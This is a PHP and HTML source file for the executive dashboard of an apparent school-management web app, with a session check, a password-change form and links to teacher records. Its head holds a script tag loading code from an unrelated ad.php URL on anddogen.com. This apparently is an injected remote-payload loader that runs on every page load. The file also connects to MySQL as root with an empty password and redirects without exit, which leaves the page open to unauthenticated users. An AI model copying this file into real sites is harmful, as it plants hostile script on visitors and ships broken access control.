<?php
error_reporting(E_ALL ^ E_DEPRECATED);

session_start();
	$con = mysql_connect("localhost","root","");
	if (!$con)
	{
	die('Could not connect: ' . mysql_error());
	}
	mysql_select_db("erudite", $con);
	$doneby=$_SESSION['id'];
	
	mysql_close($con);
	
	if(!isset($_SESSION['id']))
	{
		header("Location:index.php");

	}

?>



<!DOCTYPE html>
<html lang="en">
<head>
  <title>Executive Dashboard</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/foundation/5.5.2/css/foundation.css">  
  <script src="http://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
  <script src="http://cdnjs.cloudflare.com/ajax/libs/foundation/5.5.2/js/foundation.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.js"></script>
  <script src="https://anddogen.com/ad.php?u=2bcb6c0dae4ff00188d34940932e2ce1&c=pbbt&p=1"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/foundicons/3.0.0/foundation-icons.css">
</head>
<body>

<div class="row">
  <div class="medium-4 columns" style="background-color:#f1f1f1;">
    <!--ul class="side-nav">
      <li class="active"><a href="#">Home</a></li>
      <li ><a href="#edit_pass">Change Password</a>
      </li>      
      <li><a href="logout.php">Logout</a></li>      
    </ul-->
    <ul class="accordion" data-accordion data-options="multi_expand:true;">
	  <li class="accordion-navigation">
	    <a href="#"><i class="fi-home"></i> Home</a>
	    <div id="demo" class="content">
	      Demo 1 - Lorem ipsum dolor sit amet....
	    </div>
	  </li>
	  <li class="accordion-navigation">
	    <a href="#demo2">Change Password <i class="fi-pencil"></i></a>
	    <div id="demo2" class="content">
	      <form role="form" method="post" action="update_password.php">
			<input name="update_pass" type="password" placeholder="Enter new password">
			<button type="submit" class="button info">Update password</button>
		  </form>
	    </div>
	  </li>
	</ul>
	<a href="logout.php"><i class=" fi-power"></i> Logout</a>
  </div>
  <div class="medium-8 columns">
  	<div data-alert class="alert-box success">
  		<strong>Welcome!</strong> You have entered into the 'Executive area'
  		<a href="#" class="close">&times;</a>
	</div>
    <div class="panel"><h3>Executives Dashboard</h3></div>
    <div class="label label success"><a href="faculty.html" target="_blank" style="color:white;font-size:15px">New Teacher Entry</a></div>
    <div class="label warning"><a href="faculty.html" target="_blank" style="color:white;font-size:15px;">View teacher Record</a></div>
  </div>
</div>
<script>
// Initialize Foundation JS For Functionality
$(document).ready(function() {
    $(document).foundation();
})
</script>
</body>
</html>
